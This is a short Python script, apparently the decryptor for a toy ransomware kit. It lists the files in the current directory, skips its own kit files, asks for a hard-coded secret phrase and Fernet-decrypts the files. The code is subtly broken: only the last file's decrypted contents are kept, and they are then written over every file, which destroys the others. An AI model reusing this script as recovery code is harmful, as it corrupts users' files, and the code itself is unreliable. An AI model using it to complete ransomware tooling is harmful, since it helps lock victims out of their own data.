#!/usr/bin/env python3
import os
from cryptography.fernet import Fernet

files =[]
for file in os.listdir():
	if file == "ben.py" or file == "thekey.key" or file == "dec.py":
		continue
	if os.path.isfile(file):
		files.append(file)
print(files)
with open("thekey.key","rb") as key:
	secretkey=key.read()
ces = "SHRU"
user_phrase = input("ENTER THE SECRET PHRASE: ")
if user_phrase == ces:
	for file in files:
		with open(file, "rb") as thefile:
			contents = thefile.read()

		contents_decrypted = Fernet(secretkey).decrypt(contents)
	for file in files:
		with open(file, "wb") as thefile:
			thefile.write(contents_decrypted)
	print("Congrsts your files have been decrpted")
else:
	print("Sorry!you  wrote a wrong secretphrase")